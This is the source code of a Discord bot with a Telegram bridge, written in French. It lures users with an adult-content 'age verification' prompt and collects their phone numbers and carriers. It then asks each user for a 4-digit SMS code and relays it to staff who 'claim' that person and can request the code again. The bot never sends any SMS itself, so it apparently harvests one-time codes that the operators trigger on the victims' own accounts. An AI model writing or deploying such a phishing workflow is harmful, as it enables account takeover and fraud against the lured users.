require("dotenv").config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags } = require("discord.js");
const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
const pending = new Map();
const blacklistedNums = new Set();
const blacklistedUsers = new Set();
const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
let tgBot = null;
function notifyTelegram(tgId, text) {
  if (tgBot) tgBot.telegram.sendMessage(tgId, text).catch(() => {});
}

function formatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

function getOperator(p) {
  const pre = p.slice(0, 4);
  const bouygues = new Set(["0653", "0660", "0661", "0662", "0663", "0664", "0665", "0666", "0667", "0668", "0698", "0699", "0760", "0761", "0762", "0763"]);
  const free = new Set(["0651", "0652", "0654", "0656", "0768", "0769", "0783", "0784"]);
  const orange = new Set(["0607", "0608", "0630", "0631", "0632", "0633", "0634", "0670", "0671", "0672", "0673", "0674", "0675", "0676", "0677", "0678", "0679", "0680", "0681", "0682", "0683", "0684", "0685", "0686", "0687", "0688", "0689", "0707", "0770", "0771", "0776", "0777", "0780", "0781", "0782", "0785", "0786", "0787", "0788", "0789", "0790"]);
  if (bouygues.has(pre)) return "Bouygues Mobile";
  if (free.has(pre)) return "Free Mobile";
  if (orange.has(pre)) return "Orange";
  if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
  return "Mobile FR";
}

async function getModChannel() {
  if (process.env.MOD_CHANNEL_ID) {
    try {
      const c = await client.channels.fetch(process.env.MOD_CHANNEL_ID);
      if (c) return c;
    } catch (e) {
      console.error("MOD_CHANNEL_ID fetch fail:", e.message);
    }
  }
  const guild = await client.guilds.fetch(MOD_GUILD_ID);
  const me = await guild.members.fetchMe().catch(() => null);
  const channels = await guild.channels.fetch();
  for (const [, ch] of channels) {
    if (ch.type !== ChannelType.GuildText) continue;
    try {
      const perms = me ? ch.permissionsFor(me) : ch.permissionsFor(guild.members.me);
      if (perms && perms.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) return ch;
    } catch {}
  }
  throw new Error("Salon modo introuvable, mets MOD_CHANNEL_ID dans Render");
}

function buildModEmbed(user, originGuild, phone, code, dateStr) {
  const operator = getOperator(phone);
  const formatted = formatPhone(phone);
  const codeLine = code ? `\`${code}\`` : "En attente du code membre";
  return new EmbedBuilder()
    .setTitle(`${user.username} • ${user.id}`)
    .setDescription(`${originGuild.name} • ${originGuild.memberCount || 0} membres`)
    .setThumbnail(user.displayAvatarURL())
    .addFields(
      { name: "Présence", value: `> 🟢 présent`, inline: false },
      { name: "Numéro", value: `> \`${formatted}\` · ${operator}`, inline: false },
      { name: "📋 Suivi vérification", value: `> 🔄 Statut — ${code ? "Code reçu" : "SMS envoyé — en attente du code membre"}\n> 🌐 Code — ${codeLine}\n> 📅 Soumis — ${dateStr} · à l'instant\n> 📩 SMS envoyé — ${dateStr} · à l'instant`, inline: false }
    )
    .setColor(0x2b2d31);
}

function buildClaimEmbed(user, originGuild, memberPresent, memberCount, dateStr, claimedBy) {
  const presence = memberPresent ? "🟢 présent" : "❌ A quitté le serveur";
  const claimLine = claimedBy ? `<@${claimedBy}>` : "@_";
  return new EmbedBuilder()
    .setTitle(`${user.username}`)
    .setDescription(`<@${user.id}> · \`${user.id}\`\n${originGuild.name}\n\n${presence} · ${memberCount} membres\n\n**Soumis** · ${dateStr}\n\nClaim par ${claimLine}`)
    .setThumbnail(user.displayAvatarURL())
    .setColor(0x2b2d31);
}

async function sendToMods(originInteraction, phone) {
  const user = originInteraction.user;
  const originGuild = originInteraction.guild;
  const key = `${originGuild.id}:${user.id}`;
  const now = new Date();
  const dateStr = now.toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  let present = true;
  try {
    await originGuild.members.fetch(user.id);
  } catch { present = false; }
  const embed = buildClaimEmbed(user, originGuild, present, originGuild.memberCount || 0, dateStr, null);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`claim_${originGuild.id}_${user.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
  );
  const modChannel = await getModChannel();
  const sent = await modChannel.send({ content: `<@&1547717348348403812>`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
  pending.set(key, { phone, code: null, originGuildId: originGuild.id, userId: user.id, date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null });
}

let readyDone = false;
async function onReady() {
  if (readyDone) return;
  readyDone = true;
  console.log(`Connecte en tant que ${client.user.tag}`);
  try {
    const cmdData = {
      name: "clear",
      description: "Supprime les messages du salon",
      default_member_permissions: "8192"
    };
    await client.application.commands.create(cmdData);
    for (const [, g] of client.guilds.cache) {
      try { await g.commands.create(cmdData); } catch {}
    }
  } catch (e) { console.error("slash create fail:", e.message); }
  const channel = await client.channels.fetch(process.env.CHANNEL_ID);
  const messages = await channel.messages.fetch({ limit: 20 });
  const old = messages.filter((m) => m.author.id === client.user.id);
  if (old.size > 0) return;
  const embed = new EmbedBuilder()
    .setTitle("🍑 ACCÈS +18 UNIQUEMENT")
    .setDescription("Tu pensais vraiment avoir **accès** à tout le serveur directement ? 😈\n\nUne partie du contenu est **caché** uniquement réservé a nos membres majeurs vérifiés.🔐\n\nListe des salons ci-dessous")
    .setImage(process.env.IMAGE_URL)
    .setFooter({ text: "Clique sur le bouton pour te faire vérifier" })
    .setColor(0xe67e22);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("verify_age").setLabel("🔓 Vérifier mon âge").setStyle(ButtonStyle.Primary)
  );
  await channel.send({ embeds: [embed], components: [row] });
}
client.once("clientReady", onReady);

client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "clear") {
    if (!i.memberPermissions.has(PermissionsBitField.Flags.ManageMessages)) {
      await i.reply({ content: "Permission manquante.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      let deleted = 0;
      while (true) {
        const msgs = await i.channel.messages.fetch({ limit: 100 });
        if (msgs.size === 0) break;
        for (const [, m] of msgs) {
          try { await m.delete(); deleted++; } catch {}
        }
        if (msgs.size < 100) break;
      }
      await i.editReply(`🧹 ${deleted} messages supprimés.`);
    } catch (e) {
      console.error("clear fail:", e);
      await i.editReply(`Erreur clear: ${e.message}`);
    }
    return;
  }
  if (i.isButton() && i.customId === "verify_age") {
    if (blacklistedUsers.has(i.user.id)) {
      await i.reply({ content: "Compte bloqué.", flags: MessageFlags.Ephemeral });
      return;
    }
    const modal = new ModalBuilder().setCustomId("verif-tel").setTitle("Vérification — Numéro de téléphone");
    const tel = new TextInputBuilder().setCustomId("phone").setLabel("Ton numéro de téléphone (10 chiffres)").setPlaceholder("0600000000").setStyle(TextInputStyle.Short).setMinLength(10).setMaxLength(10).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(tel));
    await i.showModal(modal);
    return;
  }
  if (i.isModalSubmit() && i.customId === "verif-tel") {
    const phone = i.fields.getTextInputValue("phone").trim();
    console.log(`tel recu ${i.user.id} ${phone}`);
    if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
      await i.reply({ content: "Numéro invalide.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.reply({ content: "Numéro reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
    try {
      await sendToMods(i, phone);
      console.log(`envoi modo tel ${i.user.id}`);
    } catch (e) {
      console.error("sendToMods fail:", e);
      await i.followUp({ content: `Erreur d'envoi vers la modération: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("enter_code_")) {
    const originGuildId = i.customId.replace("enter_code_", "");
    const modal2 = new ModalBuilder().setCustomId(`verif-code-dm_${originGuildId}`).setTitle("Vérification — Code SMS");
    const codeInput = new TextInputBuilder().setCustomId("code").setLabel("Ton code à 4 chiffres").setPlaceholder("0000").setStyle(TextInputStyle.Short).setMinLength(4).setMaxLength(4).setRequired(true);
    modal2.addComponents(new ActionRowBuilder().addComponents(codeInput));
    await i.showModal(modal2);
    return;
  }
  if (i.isModalSubmit() && i.customId.startsWith("verif-code-dm_")) {
    const originGuildId = i.customId.replace("verif-code-dm_", "");
    const userId = i.user.id;
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    const code = i.fields.getTextInputValue("code").trim();
    console.log(`code recu DM ${userId} ${code}`);
    if (!/^[0-9]{4}$/.test(code)) {
      await i.reply({ content: "Code invalide : 4 chiffres.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (!data) {
      await i.reply({ content: "Demande expirée, recommence la vérification.", flags: MessageFlags.Ephemeral });
      return;
    }
    data.code = code;
    pending.set(key, data);
    await i.reply({ content: "Code reçu. En attente de validation finale.", flags: MessageFlags.Ephemeral });
    try {
      const targetChannelId = data.threadId || data.modChannelId;
      const targetChannel = await client.channels.fetch(targetChannelId);
      const og = await client.guilds.fetch(originGuildId).catch(() => null);
      if (data.threadId && data.detailMessageId) {
        try {
          const detailMsg = await targetChannel.messages.fetch(data.detailMessageId);
          const newEmbed = buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
          await detailMsg.edit({ embeds: [newEmbed] });
        } catch {}
      }
      const operator = getOperator(data.phone);
      const formatted = formatPhone(data.phone);
      const logEmbed = new EmbedBuilder()
        .setTitle("📩 Code de vérification reçu")
        .addFields(
          { name: "Membre", value: `<@${userId}> \`${userId}\``, inline: false },
          { name: "Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
          { name: "Code", value: `\`${code}\``, inline: true },
          { name: "Serveur", value: `${og ? og.name : originGuildId}`, inline: false }
        )
        .setFooter({ text: data.dateStr })
        .setColor(0x57f287);
      await targetChannel.send({ content: data.claimedBy ? `<@${data.claimedBy}>` : undefined, embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`code_ok_${originGuildId}_${userId}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`code_bad_${originGuildId}_${userId}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
      )], allowedMentions: { users: data.claimedBy ? [data.claimedBy] : [] } });
      console.log(`envoi modo code ${userId}`);
    } catch (e) {
      console.error("forward code fail:", e);
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("claim_")) {
    const [, originGuildId, userId] = i.customId.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    pending.set(key, data);
    try {
      const modChannel = await client.channels.fetch(data.modChannelId);
      const modMsg = await modChannel.messages.fetch(data.modMessageId);
      const isTg = originGuildId === "tg";
      const og = isTg ? null : await client.guilds.fetch(originGuildId).catch(() => null);
      let claimedEmbed = null;
      if (isTg) {
        claimedEmbed = new EmbedBuilder().setTitle(`${data.tgName || "Telegram"}`).setDescription(`Telegram · \`${userId}\`\n\nClaim par <@${i.user.id}>`).setColor(0x2b2d31);
      } else {
        let present = true;
        try { if (og) await og.members.fetch(userId); } catch { present = false; }
        claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
      }
      await modMsg.edit({ embeds: [claimedEmbed], components: [] });
      const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
      const claimerId = i.user.id;
      const newChannel = await modGuild.channels.create({
        name: `verif-${userId}`,
        type: ChannelType.GuildText,
        parent: modChannel.parentId || null,
        permissionOverwrites: [
          { id: modGuild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
          { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
        ],
        reason: `Claim ${i.user.tag} ${userId}`
      });
      const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
      const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
      const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
        new ButtonBuilder().setCustomId(`mod_msg_${originGuildId}_${userId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
        new ButtonBuilder().setCustomId(`mod_reject_${originGuildId}_${userId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
      );
      const row2 = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuildId}_${userId}`).setPlaceholder("⚙️ Actions staff...").addOptions(
          { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
          { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
          { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
          { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
          { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
        )
      );
      const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`close_${originGuildId}_${userId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
      );
      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3] });
      data.threadId = newChannel.id;
      data.detailMessageId = detailMsg.id;
      pending.set(key, data);
      await i.reply({ content: `Salon privé créé : ${newChannel}`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      console.error("claim fail:", e);
      await i.reply({ content: `Erreur claim: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("close_")) {
    const [, originGuildId, userId] = i.customId.split("_");
    try {
      await i.reply({ content: "Suppression..." , flags: MessageFlags.Ephemeral });
      await i.channel.delete().catch(() => {});
    } catch {}
    return;
  }
  if (i.isButton() && (i.customId.startsWith("code_ok_") || i.customId.startsWith("code_bad_"))) {
    const isOk = i.customId.startsWith("code_ok_");
    const rest = i.customId.replace("code_ok_", "").replace("code_bad_", "");
    const [originGuildId, userId] = rest.split("_");
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (isOk) {
      if (originGuildId === "tg") {
        notifyTelegram(userId, "✅ Ton code est validé.");
        pending.delete(key);
        await i.reply({ content: `✅ Code OK pour Telegram ${userId}.` });
        return;
      }
      try {
        const og = await client.guilds.fetch(originGuildId);
        const member = await og.members.fetch(userId);
        await member.roles.add(process.env.ROLE_ID);
        pending.delete(key);
        try {
          const u = await client.users.fetch(userId);
          await u.send(`✅ Ton code est validé, tu as reçu tes rôles sur ${og.name}.`);
        } catch {}
        await i.reply({ content: `✅ Code OK, rôles donnés à <@${userId}>.` });
      } catch {
        await i.reply({ content: "Erreur rôle.", flags: MessageFlags.Ephemeral });
      }
      return;
    }
    if (originGuildId === "tg") notifyTelegram(userId, "❌ Ton code est faux, recommence la vérification.");
    try {
      const u = await client.users.fetch(userId);
      await u.send(`❌ Ton code est faux, recommence la vérification.`);
    } catch {}
    data.code = null;
    pending.set(key, data);
    await i.reply({ content: `❌ Code faux signalé à <@${userId}>.` });
    return;
  }
  if (i.isButton() && i.customId.startsWith("mod_")) {
    const parts = i.customId.split("_");
    const action = parts[1];
    const originGuildId = parts[2];
    const userId = parts[3];
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (!data) {
      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (action === "validate") {
      if (!data.code) {
        if (originGuildId === "tg") {
          notifyTelegram(userId, "Ton numéro est validé. Envoie ton code à 4 chiffres ici.");
          await i.reply({ content: `📩 Message Telegram envoyé à ${userId}.` });
          return;
        }
        try {
          const u = await client.users.fetch(userId);
          const dmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`enter_code_${originGuildId}`).setLabel("Entrer le code").setStyle(ButtonStyle.Primary)
          );
          await u.send({ content: `Ton numéro ${formatPhone(data.phone)} est validé. Clique pour entrer le code à 4 chiffres reçu par SMS.`, components: [dmRow] });
          await i.reply({ content: `📩 DM envoyé à <@${userId}> pour le code.` });
        } catch {
          await i.reply({ content: `Impossible de DM <@${userId}> (MP fermés).`, flags: MessageFlags.Ephemeral });
        }
        return;
      }
      try {
        const og = await client.guilds.fetch(originGuildId);
        const member = await og.members.fetch(userId);
        await member.roles.add(process.env.ROLE_ID);
        pending.delete(key);
        await i.reply({ content: `✅ Accès validé pour <@${userId}> (code ${data.code})` });
      } catch {
        await i.reply({ content: "Erreur : permissions / hiérarchie / membre introuvable.", flags: MessageFlags.Ephemeral });
      }
      return;
    }
    if (action === "reject") {
      pending.delete(key);
      await i.reply({ content: `❌ Demande de <@${userId}> rejetée.` });
      return;
    }
    if (action === "resend") {
      if (originGuildId === "tg") {
        notifyTelegram(userId, "Nouveau code demandé. Envoie ton code à 4 chiffres.");
        await i.reply({ content: `🔄 Code redemandé à Telegram ${userId}.` });
        return;
      }
      try {
        const u = await client.users.fetch(userId);
        const dmRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId(`enter_code_${originGuildId}`).setLabel("Entrer le code").setStyle(ButtonStyle.Primary)
        );
        await u.send({ content: `Nouveau code demandé. Clique pour entrer ton code à 4 chiffres.`, components: [dmRow] });
        await i.reply({ content: `🔄 Code redemandé à <@${userId}>.` });
      } catch {
        await i.reply({ content: "DM impossible.", flags: MessageFlags.Ephemeral });
      }
      return;
    }
    if (action === "msg") {
      await i.reply({ content: `💬 Envoie un MP à <@${userId}> pour la suite.`, flags: MessageFlags.Ephemeral });
      return;
    }
    return;
  }
  if (i.isStringSelectMenu() && i.customId.startsWith("mod_staff_")) {
    const sParts = i.customId.split("_");
    const originGuildId = sParts[2];
    const userId = sParts[3];
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    const value = i.values[0];
    try {
      const og = await client.guilds.fetch(originGuildId).catch(() => null);
      const member = og ? await og.members.fetch(userId).catch(() => null) : null;
      if (value === "reset") {
        pending.delete(key);
        await i.reply({ content: `🔄 Tentative de <@${userId}> réinitialisée.` });
      } else if (value === "blacklist_num") {
        if (data) blacklistedNums.add(data.phone);
        pending.delete(key);
        await i.reply({ content: `🔴 Numéro ${data ? data.phone : ""} blacklisté.` });
      } else if (value === "blacklist_user") {
        blacklistedUsers.add(userId);
        pending.delete(key);
        await i.reply({ content: `⛔ <@${userId}> blacklisté.` });
      } else if (value === "kick") {
        if (member) await member.kick("Staff");
        pending.delete(key);
        await i.reply({ content: `👢 <@${userId}> expulsé.` });
      } else if (value === "ban") {
        if (member) await member.ban({ reason: "Staff" });
        pending.delete(key);
        await i.reply({ content: `🔨 <@${userId}> banni.` });
      }
    } catch {
      await i.reply({ content: "Erreur staff.", flags: MessageFlags.Ephemeral });
    }
    return;
  }
});

async function forwardTelegramToDiscord(tgUser, phone) {
  const key = `tg:${tgUser.id}`;
  const now = new Date();
  const dateStr = now.toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const displayName = tgUser.username ? `@${tgUser.username}` : `${tgUser.first_name || "Telegram"}`;
  const embed = new EmbedBuilder()
    .setTitle(`${displayName}`)
    .setDescription(`Telegram · \`${tgUser.id}\`\n\n🟢 présent\n\n**Soumis** · ${dateStr}\n\nClaim par @_`)
    .addFields({ name: "Numéro", value: `> \`${formatPhone(phone)}\` · ${getOperator(phone)}`, inline: false })
    .setColor(0x2b2d31);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`claim_tg_${tgUser.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
  );
  const modChannel = await getModChannel();
  const sent = await modChannel.send({ content: `<@&1547717348348403812> Telegram`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
  pending.set(key, { phone, code: null, originGuildId: "tg", userId: String(tgUser.id), date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null, tgName: displayName });
}

if (process.env.TELEGRAM_BOT_TOKEN) {
  const { Telegraf, Markup } = require("telegraf");
  tgBot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
  tgBot.start((ctx) => ctx.reply("Envoie ton numéro avec le bouton ci-dessous.", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize()));
  tgBot.on("contact", async (ctx) => {
    let phone = (ctx.message.contact.phone_number || "").replace(/\D/g, "");
    if (phone.startsWith("33")) phone = "0" + phone.slice(2);
    phone = phone.slice(-10);
    if (!/^[0-9]{10}$/.test(phone)) {
      await ctx.reply("Numéro invalide.");
      return;
    }
    await ctx.reply("Numéro reçu. En attente de validation.");
    try {
      await forwardTelegramToDiscord(ctx.from, phone);
    } catch (e) {
      console.error("tg forward fail:", e);
    }
  });
  tgBot.on("text", async (ctx) => {
    const key = `tg:${ctx.from.id}`;
    const data = pending.get(key);
    if (!data || data.code) return;
    const code = (ctx.message.text || "").trim();
    if (!/^[0-9]{4}$/.test(code)) return;
    data.code = code;
    pending.set(key, data);
    await ctx.reply("Code reçu. En attente de validation finale.");
    try {
      const targetChannel = await client.channels.fetch(data.threadId || data.modChannelId);
      const logEmbed = new EmbedBuilder()
        .setTitle("📩 Code Telegram reçu")
        .addFields(
          { name: "Membre", value: `${data.tgName || ""} \`${ctx.from.id}\``, inline: false },
          { name: "Numéro", value: `\`${formatPhone(data.phone)}\``, inline: true },
          { name: "Code", value: `\`${code}\``, inline: true }
        )
        .setFooter({ text: data.dateStr })
        .setColor(0x57f287);
      await targetChannel.send({ content: data.claimedBy ? `<@${data.claimedBy}>` : undefined, embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`code_ok_tg_${ctx.from.id}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`code_bad_tg_${ctx.from.id}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
      )], allowedMentions: { users: data.claimedBy ? [data.claimedBy] : [] } });
    } catch (e) {
      console.error("tg code forward fail:", e);
    }
  });
  tgBot.launch().then(() => console.log("Telegram ok")).catch((e) => console.error("Telegram fail:", e.message));
}

client.login(process.env.TOKEN);
